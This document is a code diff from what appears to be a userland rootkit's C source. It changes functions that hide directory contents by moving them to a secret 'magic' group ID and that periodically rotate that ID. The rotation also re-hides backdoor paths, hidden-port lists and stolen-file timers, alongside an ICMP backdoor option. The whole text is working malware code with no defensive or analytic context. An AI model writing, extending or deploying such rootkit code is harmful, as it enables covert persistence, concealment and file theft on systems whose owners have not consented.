@@ -1,10 +1,12 @@
 void hidedircontents(const char *path, gid_t newgid){
+    DIR *dp;
+    struct dirent *dir;
+
     hook(COPENDIR, CREADDIR);
 
-    DIR *dp = call(COPENDIR, path);
+    dp = call(COPENDIR, path);
     if(dp == NULL) return;
 
-    struct dirent *dir;
     while((dir = call(CREADDIR, dp)) != NULL){
         if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
             continue;
@@ -17,23 +19,34 @@ void hidedircontents(const char *path, gid_t newgid){
     chown_path(path, newgid);
 }
 
-gid_t changerkgid(void){
+
+// creates a new magic ID.
+// handles rehiding & respawning things that need it.
+// returns the new magic ID when finished.
+// curtime should be the result of a call to time(NULL).
+// if AUTO_GID_CHANGER is defined then curtime is written to GIDTIME_PATH as the new time since last GID change.
+gid_t changerkgid(int curtime){
     FILE *fp;
     gid_t newgid=0;
-    char buf[16];
-#ifdef USE_ICMP_BD
+    char buf[32];
+#if defined USE_ICMP_BD || defined HIDE_MY_ASS
     gid_t oldgid=readgid();
 #endif
+    int taken;
 
     hook(CFOPEN, CFWRITE, CCHMOD);
 
-    srand(time(NULL));
-    while(gidtaken(newgid))
+    srand(curtime);
+    while((taken = gidtaken(newgid)))
         newgid = (gid_t)(rand() % (MAX_GID - MIN_GID + 1)) + MIN_GID;
+
+    if(taken < 0)  // couldn't open /etc/group?
+        newgid = MAGIC_GID;
 
     fp = call(CFOPEN, GID_PATH, "w");
     if(fp == NULL)
         return MAGIC_GID;
+    memset(buf, 0, sizeof(buf));
     snprintf(buf, sizeof(buf), "%u", newgid);
     call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
@@ -54,13 +67,17 @@ gid_t changerkgid(void){
     for(int i = 0; i != BDVPATHS_SIZE; i++)
         chown_path(bdvpaths[i], newgid);
 
+#if defined FILE_STEAL && defined FILE_CLEANSE_TIMER
+    chown_path(CLEANEDTIME_PATH, newgid);
+#endif
 #ifdef HIDE_PORTS
     chown_path(HIDEPORTS, newgid);
 #endif
 #ifdef HIDE_MY_ASS
-    hidemyass();
+    hidemyass(oldgid);
 #endif
-
-    writenewtime(GIDTIME_PATH, time(NULL));
+#ifdef AUTO_GID_CHANGER
+    writenewtime(GIDTIME_PATH, curtime);
+#endif
     return newgid;
 }
